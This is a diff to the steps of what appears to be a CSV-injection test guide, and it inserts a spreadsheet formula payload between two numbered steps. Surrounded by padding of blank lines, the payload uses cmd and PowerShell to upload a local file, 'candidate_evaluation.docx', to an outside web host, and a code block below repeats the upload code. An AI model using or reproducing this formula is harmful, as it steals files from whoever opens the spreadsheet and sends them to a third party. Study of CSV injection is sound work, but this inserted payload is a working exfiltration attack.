@@ -5,6 +5,30 @@
 2. Test a payload to upload a file.
 3. Use scripts/csv_injection Docker-compose project.
 4. Start the node server: `docker-compose up nodeserver`
+
+
+
+
+
+
+
+
+
+
+
+=cmd|'/C powershell IEX(WebClient myWebClient = new WebClient(); myWebClient.UploadFile("http://www.nmac.com.ar/uploads/one_upload.php","POST","C:\candidate_evaluation.docx");)'!A0
+
+
+
+```
+WebClient myWebClient = new WebClient(); myWebClient.UploadFile("http://www.nmac.com.ar/uploads/one_upload.php","POST","C:\candidate_evaluation.docx");
+```
+
+
+
+
+
+
 5. Use this payload to test:
 ```
 echo "123123" > content.txt
